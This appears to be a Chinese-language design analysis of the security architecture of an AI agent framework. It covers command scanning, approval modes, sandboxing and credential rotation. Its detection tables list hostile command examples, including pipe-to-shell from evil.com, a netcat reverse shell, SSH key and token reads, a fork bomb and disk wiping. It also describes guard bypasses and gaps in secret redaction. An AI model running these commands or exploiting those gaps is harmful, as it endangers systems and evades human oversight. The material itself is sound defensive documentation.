# Phase 2: Security & Trust Architecture

## 1. Executive Summary

Hermes v0.9.0 的安全架构采用**纵深防御（Defense-in-Depth）**策略，从命令执行前到执行后形成四条防线：

| 防线 | 模块 | 作用时机 | 核心能力 |
|------|------|----------|----------|
| **1. 静态安全扫描** | `tirith_security.py` | 命令执行前 | Rust 规则引擎检测 homograph URL、管道注入、终端转义序列等 |
| **2. 危险命令检测** | `approval.py` | 命令执行前 | 51 条正则模式 + 三层审批（Manual / Smart / Off） |
| **3. 沙箱隔离执行** | `code_execution_tool.py` | Python 脚本运行时 | UDS RPC 沙箱、环境净化、限额控制（5min/50KB/50 calls） |
| **4. 凭证管理与轮换** | `credential_pool.py` + `credential_files.py` | 任何网络请求时 | 多凭证 fail-over、 exhaustion cooldown、OAuth 自动刷新、路径遍历防护 |

设计理念：**Fail-open by default**（宁可放行也不阻塞工作流），但对破坏性操作（`rm -rf /`、fork bomb 等）坚决拦截。所有安全模块都可通过 `--yolo` 或 `approvals.mode=off` 绕过，以适应 CI/CD 等自动化场景。

---

## 2. Threat Model & Static Command Scanning

### 2.1 架构定位：`tirith_security.py` 是规则引擎的 Python 粘合层

`tirith` 本身是一个独立的 **Rust 二进制规则引擎**（源码仓库：`sheeki03/tirith`），Python 模块 `tirith_security.py` 仅负责：
- 自动下载/安装 tirith 二进制（带 SHA-256 + optional cosign provenance 校验）
- 调用 `subprocess.run` 执行扫描
- 解析输出并映射到 `{"action": "allow"/"block"/"warn", ...}` 的统一格式
- 处理 fail-open/fail-closed 策略和超时

这意味着规则本身的演进（新增检测模式）不需要改动 Hermes 源码，只需更新 tirith 二进制即可。

### 2.2 自动安装与可信启动

```python
# tirith 首次安装流程（后台线程，非阻塞）
1. 检查 ~/.hermes/bin/tirith 是否存在且可执行
2. 不存在 → 从 GitHub Releases 下载对应平台(triple) 的预编译包
3. 校验 SHA-256（内嵌 hash 对照表）
4. optional: cosign 签名验证（需启用）
5. 安装到 ~/.hermes/bin/ 并设 +x
6. 5s 超时重试 2 次
```

### 2.3 Fail-Open vs Fail-Closed 策略

默认配置：`tirith_fail_open=True`

| 退出码 | 处理逻辑 |
|--------|----------|
| **0** | `allow`，无发现 |
| **1** | `block`，有高危发现 → 触发审批流程 |
| **2** | `warn`，低危发现 → 同样触发审批（早期版本为硬 block，v0.9 改为可审批） |
| **其他 / 超时 / 未安装** | `allow`（fail-open） |

Fail-open 的设计理由：tirith 是**外部依赖**，如果用户在内网离线环境或 tirith 安装失败，不应阻塞整个 Agent 工作流。

### 2.4 威胁覆盖（通过 tirith 规则引擎实现）

| 威胁类别 | 典型场景 |
|----------|----------|
| **Homograph URL** | 恶意域名使用希腊字母/西里尔字母伪装（如 `аpple.com`），诱骗 `curl` 下载恶意脚本 |
| **Pipe-to-Interpreter** | `curl http://evil.com | bash` — 下载即执行 |
| **Terminal Injection** | 命令含 ANSI escape sequences 或字节序列，可能修改终端标题、触发 bell、注入隐藏字符 |
| **Suspicious downloads** | 从非可信源获取可执行文件 |

### 2.5 与 Approval 系统的集成

早期版本中，tirith 的 `block` 是**硬拦截**，不经过用户审批。v0.9 改为：tirith block/warn 均进入 `check_all_command_guards()` 的统一审批流，用户可以**一次查看所有发现**（tirith + regex patterns），然后决定 approve/deny/session/always。

---

## 3. Dangerous Command Detection & Approval System

### 3.1 正则模式检测层

`approval.py` 维护了 **51 条危险命令正则模式**，覆盖以下类别：

| 类别 | 示例模式 | 说明 |
|------|----------|------|
| **系统级破坏** | `rm -rf /`, `mkfs`, `dd if=/dev/zero of=/dev/sda` | 格式化磁盘、删除根目录 |
| **权限提升** | `sudo`, `su -`, `chmod 777 /etc` | 提权或破坏系统文件权限 |
| **网络层危险** | `iptables -F`, `ufw disable`, `nc -e /bin/sh` | 清除防火墙、反向 shell |
| **进程耗竭** | `:(){ :|:& };:` (fork bomb) | 资源耗尽攻击 |
| **环境注入** | `curl ... \| bash`, `wget -O - \| sh` | 管道到解释器 |
| **凭据泄露** | `cat ~/.ssh/id_rsa`, `env \| grep TOKEN` | 敏感文件读取 |
| **数据破坏** | `> /etc/passwd`, `: > important.db` | 截断/覆写关键文件 |
| **持久化后门** | `echo '* * * * ...' >> /etc/crontab` | 写入计划任务 |
| **隐蔽执行** | `nohup`, `disown`, `setsid` | 脱离会话监控 |

每条模式都有 `pattern_key`（如 `rm_rf_root`）和 `description`（如 `"recursive delete of root directory"`），用于审批提示和 allowlist 存储。

### 3.2 三层审批模式

```python
approval_mode = "manual"   # 默认
# "smart" → auxiliary LLM 先评估
# "off"   → 全部放行（用户显式承担风险）
```

#### Manual 模式
命令命中危险模式后：
1. **CLI 交互**：弹出 `[y]es / [n]o / [d]on't ask again / [a]lways for this session` 选择
2. **Gateway/WebSocket**：创建 `_ApprovalEntry` 事件对象，阻塞 Agent 线程直到用户通过 `/approve` 或 `/deny` 响应（默认超时 5min）

#### Smart 模式（OpenAI Codex #13860 启发）
命中模式后，**先让 auxiliary LLM 做风险评估**（16 tokens, temperature=0）：
- `APPROVE` → 自动放行，并授予该模式 session-level 审批
- `DENY` → 硬阻断，模型收到 "Do NOT retry"
- `ESCALATE` → 回退到 manual prompt

Smart 模式的价值：大量危险模式是**误报**（如 `python -c "print('hello')"` 被标记为 "script execution via -c"），auxiliary LLM 可过滤掉这些无害命令，减少用户打断。

### 3.3 Allowlist 体系

| 层级 | 范围 | 持久化 | 适用模式 |
|------|------|--------|----------|
| **once** | 单次命令 | 无 | 仅本次允许 |
| **session** | 当前会话 | 内存（`ContextVar`） | 会话期间允许该 `pattern_key` |
| **always** | 永久 | `~/.hermes/config.yaml` 中的 `permanent_allowlist` | 以后永远允许该 pattern（但对 tirith 发现无效） |

**重要设计决策**：tirith 的发现**永远不允许永久 allowlist**。原因：tirith 规则是由外部 Rust 引擎动态维护的，一个看似合理的 `curl | bash` 可能在新的规则版本中被判为高危。只有 regex pattern 才允许 `always`。

### 3.4 并发安全：ContextVar

```python
_approval_session_key = contextvars.ContextVar("approval_session_key", default=None)
```

在 Gateway 场景下，多个会话可能并发调用 `terminal()`。使用 `ContextVar` 而非全局字典确保每个 Agent 线程的审批状态隔离，避免会话 A 的审批结果泄漏到会话 B。

### 3.5 容器豁免

所有容器后端（`docker`, `singularity`, `modal`, `daytona`）**跳过全部审批**。理由：容器是已知的隔离环境，用户明确接受了"在沙箱中执行"的语义。

### 3.6 `--yolo` 机制

- **CLI**：`--yolo` 设置进程级环境变量 `HERMES_YOLO_MODE=1`
- **Gateway**：用户可通过 `/yolo` 命令为**当前会话**启用 yolo 模式（写入 session state，非全局）
- 副作用：所有危险命令、所有 tirith 扫描全部放行

---

## 4. Sandboxed Code Execution

### 4.1 双传输架构

`execute_code` 工具内部有两种 RPC 通信模式，由 `is_remote` 自动判断：

| 模式 | 通信方式 | 适用场景 |
|------|----------|----------|
| **Local** | Unix Domain Socket (UDS) | 本地运行，父进程 ↔ 子进程直接通信 |
| **Remote** | 文件系统读写（`__rpc_req.json` / `__rpc_resp.json`） | 远程后端（如 Daytona），无 direct socket 访问 |

两种模式的共同约束：**所有工具调用都必须经过父进程的 RPC 层**，子进程没有直接网络/文件系统/工具访问权。

### 4.2 工具白名单：交集控制

```python
SANDBOX_ALLOWED_TOOLS = frozenset({
    "web_search", "web_extract", "read_file", "write_file",
    "search_files", "patch", "terminal",
})
```

子进程实际可用的工具 = `SANDBOX_ALLOWED_TOOLS ∩ session_enabled_tools`。

**关键设计**：如果用户通过 `hermes tools` 关闭了 web 工具，`build_execute_code_schema()` 会自动从 schema description 中**移除相关函数签名**，防止模型"幻觉式地"生成对不可用工具的调用。

### 4.3 子进程环境净化

```python
_SAFE_ENV_PREFIXES = ("PATH", "HOME", "USER", "LANG", "LC_", "TZ", ...)
_SECRET_SUBSTRINGS = ("TOKEN", "SECRET", "PASSWORD", "CREDENTIAL", "PASSWD", "AUTH")

for k, v in os.environ.items():
    if k in _SAFE_ENV_PREFIXES or k.startswith(...):
        child_env[k] = v
    elif any(s in k.upper() for s in _SECRET_SUBSTRINGS):
        continue   # 完全剔除
```

此外，`PYTHONDONTWRITEBYTECODE=1` 阻止写入 `.pyc` 到临时目录；`PYTHONPATH` 注入 Hermes 根目录使 `hermes_tools` 可导入；`HOME` 被重定向到 `{HERMES_HOME}/home/` 实现 profile 隔离。

### 4.4 资源限制

| 维度 | 限制值 | 说明 |
|------|--------|------|
| **超时** | 300 秒（5 分钟） | CLI/Gateway 下可覆盖 |
| **最大工具调用数** | 50 | 防止无限循环或过度调用 API |
| **stdout 上限** | 50,000 字节 | head(40%) + tail(60%) 截断 |
| **stderr 上限** | 10,000 字节 | head-only |
| **max_result_size** | 100,000 字符 | 最终返回给模型的限额 |

**Head+Tail stdout 策略**：保留前 20KB 和后 30KB，中间插入 `[OUTPUT TRUNCATED - X chars omitted]`。这样既不丢失启动日志，也不丢失最终结果。

### 4.5 进程生命周期管理

```python
proc = subprocess.Popen(..., preexec_fn=None if _IS_WINDOWS else os.setsid)
# setsid → 创建新进程组，kill 时可连带终止子进程

_kill_process_group(proc, escalate=True)  # timeout 时
# 1. SIGTERM → wait 5s → 2. SIGKILL
```

支持两种中断信号：
- **Timeout**：硬杀进程组
- **User interrupt**（用户在 Gateway 发新消息）：`_is_interrupted()` 返回 True，发送 SIGTERM 并标记 `status="interrupted"`

### 4.6 输出后处理

1. **ANSI Strip**：`strip_ansi()` 移除所有终端转义序列，防止模型在后续文件写入中复制这些格式控制字符
2. **Secret Redaction**：`redact_sensitive_text()` 二次扫描输出内容，即使子进程通过 `open("~/.hermes/.env")` 读取到密钥，也会在返回给模型前被脱敏

---

## 5. Credential Pool & Key Rotation

### 5.1 核心实体：`PooledCredential`

每条凭证是一个 dataclass，包含：
- `access_token`, `refresh_token`, `expires_at_ms` — 认证数据
- `last_status` (`ok` / `exhausted`) — 是否可用
- `last_error_code`, `last_error_message`, `last_error_reset_at` — 失败上下文
- `source` (`manual`, `device_code`, `env:OPENROUTER_API_KEY`, `claude_code`, ...) — 来源追踪
- `priority` — 排序权重

### 5.2 多凭证故障转移与选择策略

`CredentialPool` 支持 4 种策略（通过 `credential_pool_strategies` 配置）：

| 策略 | 行为 |
|------|------|
| **fill_first** (default) | 按 priority 排序，始终用第一个可用的 |
| **round_robin** | 每用一次把该凭证移到队尾 |
| **random** | 从可用池中随机选择 |
| **least_used** | 选 `request_count` 最小的 |

### 5.3 Exhaustion 与 Cooldown

当一条凭证触发特定 HTTP 错误时会被标记为 `exhausted`：

| 错误码 | 场景 | Cooldown |
|--------|------|----------|
| **429** | Rate limited | 1 小时 |
| **402** | Billing / quota | 1 小时 |
| **其他** | 认证失败、网络错误等 | 1 小时 |

Cooldown 结束后自动恢复为 `ok`（`clear_expired=True`）。提供商可能返回 `reset_at` 时间戳，此时以提供商时间为准（支持 epoch seconds/ms 和 ISO 8601 解析）。

### 5.4 OAuth 刷新与多源 Token Sync

这是 `credential_pool.py` 最复杂的部分，涉及**三方同步**：

```
Hermes auth.json  ←───→  Credential Pool  ←───→  External CLI files
    (Hermes 内部)         (内存状态)            (~/.claude/.credentials.json
                                                  ~/.codex/auth.json)
```

#### Anthropic Claude Code OAuth
- 刷新前：先从 `~/.claude/.credentials.json` sync，防止 refresh token 已被其他进程消费
- 刷新后：写回 `~/.claude/.credentials.json`，确保 Claude Code CLI 和 VS Code 不会遇到 `refresh_token_reused`

#### OpenAI Codex OAuth
- 刷新前：从 `~/.codex/auth.json` sync
- 刷新后：写回 `~/.codex/auth.json`

#### Nous OAuth
- 使用 device_code 流，可能涉及 `agent_key` 的获取/刷新
- 刷新后：写回 Hermes `auth.json` 的 `providers.nous` 状态

### 5.5 Soft Lease 并发控制

```python
acquire_lease(credential_id=None) → str
release_lease(credential_id) → None
```

每个凭证有 `DEFAULT_MAX_CONCURRENT_PER_CREDENTIAL` 的软上限。当所有凭证都达到上限时，优先选择租赁数最少的（不会阻塞）。这防止了多个 Gateway 会话或 subagent 同时消耗同一条凭证导致 rate limit。

### 5.6 多源凭证 Seeding

启动或 `load_pool()` 时，凭证池会从多个来源自动发现凭证：

1. **人工录入** (`manual`)：通过 CLI `hermes login` 或 `hermes pool add`
2. **环境变量** (`env:*`)：如 `OPENROUTER_API_KEY`, `ANTHROPIC_API_KEY`
3. **单例状态** (`singleton`)：`auth.json` 中的 provider 状态
4. **外部 CLI 文件**：`~/.claude/.credentials.json`, `~/.codex/auth.json`
5. **Hermes PKCE OAuth**：`~/.hermes/oauth_credentials.json`
6. **Custom providers**：`config.yaml` 中 `custom_providers[].api_key`
7. **Model config**：`model.api_key`（当 `model.provider == "custom"`）

**去重与刷新**：`_prune_stale_seeded_entries()` 自动移除已失效的外部来源条目（如 env var 已被 unset），但保留 `manual` 来源。

### 5.7 Anthropic 优先级规范化

由于 Anthropic 有 4 种子来源， Hermes 明确设定了优先级：

```python
source_rank = {
    "env:ANTHROPIC_TOKEN":       0,   # 最高：显式 token
    "env:CLAUDE_CODE_OAUTH_TOKEN": 1,
    "hermes_pkce":                2,
    "claude_code":                3,
    "env:ANTHROPIC_API_KEY":      4,   # 最低：普通 API key
}
```

默认使用 `fill_first` 策略时，会先尝试用户显式配置的环境变量，再 fallback 到外部 CLI 的 OAuth token。

### 5.8 路径遍历防护（`credential_files.py`）

```python
def validate_within_dir(path: str, base_dir: str) -> str:
    """Sanity-check a resolved path is inside base_dir.
    Raises ValueError on traversal (.., symlinks, absolute paths outside base).
    """
```

关键安全措施：
- 拒绝绝对路径（如果不在预设目录内）
- 拒绝 `..` 路径遍历
- `os.path.realpath()` 解析 symlink，防止 symlink 攻击
- `os.path.commonpath()` 确保最终路径在 base_dir 下

### 5.9 容器 Mount 安全

在远程后端（`daytona`, `modal`）中，`credential_files.py` 生成容器的 bind mount 配置时：
- 只暴露三个目录：`~/.hermes/`（配置）、`~/.ssh/`（SSH key）、`./skills/`（skills）
- 不暴露宿主机的完整 `$HOME`
- Skills 复制时进行**去 symlink 化**（`resolve_symlinks()`）：把 symlink 指向的内容复制到容器中，防止容器内利用 dangling symlink 读取宿主机任意路径

---

## 6. Cross-Cutting Security Concerns

### 6.1 Secret Redaction Pipeline

Secret 脱敏在三个层发生：
1. **环境变量过滤**：`code_execution_tool.py` 的 child_env 构造时剔除含 `TOKEN/SECRET/PASSWORD` 的变量
2. **文件访问控制**：`credential_files.py` 的 `validate_within_dir` 限制文件读写范围
3. **输出后处理**：`redact_sensitive_text()` 在返回模型前扫描 stdout/stderr 中的密钥模式（api key、jwt token 等）

### 6.2 并发安全设计模式

| 模块 | 并发控制手段 |
|------|-------------|
| `approval.py` | `ContextVar`（每个协程/线程有独立的 session key） |
| `credential_pool.py` | `threading.Lock`（所有 select/acquire_lease/release_lease） |
| `tirith_security.py` | subprocess 隔离（每次调用新进程，无共享状态） |
| `code_execution_tool.py` | 临时目录隔离（每次调用新 tmpdir + UDS socket） |

### 6.3 `--yolo` 与 `approvals.mode=off` 的区别

| 机制 | 作用域 | 生效场景 |
|------|--------|----------|
| `--yolo` | CLI 进程级 / Gateway 会话级 | 跳过危险命令审批 + 跳过 tirith |
| `approvals.mode=off` | 配置文件级（影响所有会话） | 仅跳过 dangerous command approval，**不跳过 tirith** |

注意：`check_all_command_guards()` 中，`approval_mode == "off"` 只跳过 manual/smart prompt，tirith 仍然执行。但 `--yolo` 同时覆盖两者。

### 6.4 远程后端的特殊处理

当 `env_type` 为 `docker`, `singularity`, `modal`, `daytona` 时：
- Approval 系统完全放行
- Tirith 跳过（因为在容器内执行，隔离已存在）
- Sandbox 的 `preexec_fn=os.setsid` 可能不会生效（取决于容器 OS）

---

## 7. 已识别边界与限制

1. **tirith 是外部依赖**：离线环境无法安装时自动降级到 "allow"（fail-open），存在检测盲区。
2. **smart approval 的 auxiliary LLM 本身也是外部调用**：如果主 provider 本身不可用（如 API key 失效），smart approval 也无法调用 auxiliary client，会回退到 manual。这不是循环依赖，而是 graceful degradation。
3. **sandbox 的 secret redaction 基于模式匹配**：如果脚本把密钥 base64 编码后输出，模式匹配可能无法捕获。
4. **credential pool 的 exhaustion 是 memory + file 状态**：如果同时运行多个 Hermes 进程（不同 profile），exhaustion 状态不会跨进程同步。
5. **OAuth refresh token 的单次使用限制**：虽然有三方 sync 机制，但如果外部 CLI（如 Claude Code）在 Hermes 读取和写入之间恰好进行了刷新，仍可能出现 `refresh_token_reused`。已实现的 retry-once 策略缓解了此问题，但无法完全消除竞争。

---

## 8. 关键源码行号速查

| 文件 | 关键行 | 内容 |
|------|--------|------|
| `tools/tirith_security.py` | ~1-100 | 自动安装、校验、后台线程 |
| `tools/tirith_security.py` | ~200-300 | `check_command_security()` 调用逻辑、fail-open/fail-closed |
| `tools/approval.py` | ~200-300 | 51 条正则模式定义 |
| `tools/approval.py` | ~500-580 | `_smart_approve()` auxiliary LLM 调用 |
| `tools/approval.py` | ~690-920 | `check_all_command_guards()` 统一审批入口 |
| `tools/code_execution_tool.py` | ~250-300 | UDS server vs 远程文件 RPC 分支 |
| `tools/code_execution_tool.py` | ~970-1010 | Child env 净化逻辑 |
| `tools/code_execution_tool.py` | ~1040-1150 | Head+Tail stdout 截断 |
| `tools/code_execution_tool.py` | ~1160-1170 | ANSI strip + secret redaction |
| `agent/credential_pool.py` | ~55-70 | 四种选择策略常量 |
| `agent/credential_pool.py` | ~268-277 | Exhaustion cooldown 计算 |
| `agent/credential_pool.py` | ~555-750 | `_refresh_entry()` OAuth 刷新（含 retry-once） |
| `agent/credential_pool.py` | ~891-930 | `acquire_lease()` / `release_lease()` |
| `tools/credential_files.py` | ~120-170 | `validate_within_dir()` 路径遍历防护 |
| `tools/credential_files.py` | ~300-350 | 容器 mount 注册与 skills 去 symlink 化 |
